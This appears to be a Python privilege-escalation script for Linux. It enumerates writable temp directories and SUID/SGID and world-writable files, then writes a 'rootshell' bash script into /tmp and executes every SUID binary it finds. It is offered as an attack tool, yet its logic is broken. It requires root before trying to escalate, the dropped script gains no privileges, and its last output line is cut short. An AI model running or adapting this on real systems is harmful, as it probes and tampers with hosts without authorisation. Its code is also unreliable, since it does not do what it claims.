import os
import subprocess

def check_permissions():
    # Check if the current user has root privileges
    if os.geteuid() != 0:
        print("[-] You need to have root privileges to run this script!")
        exit(1)

def get_system_info():
    # Get system information
    uname = subprocess.check_output("uname -a", shell=True).decode()
    release = subprocess.check_output("lsb_release -d", shell=True).decode()
    print("[+] System information:")
    print(uname)
    print(release)

def check_for_escalation_vectors():
    # Check for common privilege escalation vectors
    print("[*] Checking for common privilege escalation vectors...")
    # Check for writable directories
    dirs_to_check = ["/tmp", "/var/tmp", "/dev/shm"]
    for d in dirs_to_check:
        if os.access(d, os.W_OK):
            print("[+] Found writable directory: {}".format(d))
    # Check for SUID/SGID files
    suid_files = subprocess.check_output("find / -type f -perm -4000 -o -perm -2000 2>/dev/null", shell=True).decode().split("\n")
    for f in suid_files:
        if f:
            print("[+] Found SUID/SGID file: {}".format(f))
    # Check for world-writable files
    ww_files = subprocess.check_output("find / -type f -perm -0002 2>/dev/null", shell=True).decode().split("\n")
    for f in ww_files:
        if f:
            print("[+] Found world-writable file: {}".format(f))

def escalate_privileges():
    # Use identified escalation vectors to escalate privileges
    print("[*] Attempting to escalate privileges...")
    # Write a root shell to a writable directory
    dirs_to_check = ["/tmp", "/var/tmp", "/dev/shm"]
    for d in dirs_to_check:
        if os.access(d, os.W_OK):
            with open("{}/rootshell".format(d), "w") as f:
                f.write("#!/bin/bash\n/bin/bash")
            subprocess.call("chmod +x {}/rootshell".format(d), shell=True)
            print("[+] Wrote root shell to {}/rootshell".format(d))
            break
    # Use SUID/SGID file to execute a root shell
    suid_files = subprocess.check_output("find / -type f -perm -4000 -o -perm -2000 2>/dev/null", shell=True).decode().split("\n")
    for f in suid_files:
        if f:
            subprocess.call("{}".format(f), shell=True)
            print("[+] Executed root")
